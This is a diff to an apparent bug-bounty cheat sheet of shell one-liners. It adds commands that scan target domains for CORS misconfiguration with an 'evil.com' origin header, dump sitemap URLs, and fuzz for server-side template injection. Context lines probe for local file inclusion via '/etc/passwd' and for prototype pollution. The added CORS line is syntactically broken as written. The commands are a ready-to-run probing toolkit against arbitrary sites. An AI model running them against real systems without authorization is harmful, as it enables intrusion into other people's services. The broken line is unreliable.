@@ -24,6 +24,17 @@ gau <target-domain> | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c '
 # Find Prototype Pollution
 subfinder -d <target-domain> -all -silent | httpx -silent -threads 300 | anew -q alive.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' alive.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
 
+# CORS Misconfiguration
+site="URL"; gau "$site" | while read url; do target=$(curl -sIH "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found] echo $url; else echo Nothing on "$url"; fi; done
+
+
+# Dump URLs from sitemap.xml
+curl -s <target-domain>/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g'
+
+# SSTI to RCE
+waybackurls <target-domain> | qsreplace "abc{{9*9}}" > fuzz.txt
+ffuf -u FUZZ -w fuzz.txt -replay-proxy http://127.0.0.1:8080/
+
 # take a screenshot of every page from domain in txt file with aquatone (https://github.com/michenriksen/aquatone/releases)
 cat <file> | aquatone -ports 80,443,3000,3001
 cat <file> | aquatone -out ./aquatone_screenshots -screenshot-timeout 1000
